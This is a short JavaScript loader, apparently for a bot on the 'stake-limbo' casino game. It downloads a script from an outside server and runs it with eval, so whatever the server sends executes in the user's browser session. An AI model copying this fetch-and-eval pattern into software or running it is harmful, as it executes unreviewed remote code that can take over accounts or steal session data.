const WDB_API = 'https://api-bot.mhqb365.com';
const CASINO_GAME = 'stake-limbo';
(async function () {
  let installer = await fetch(WDB_API + '/stable/init')
  installer = await installer.text()
  eval(installer)
})();
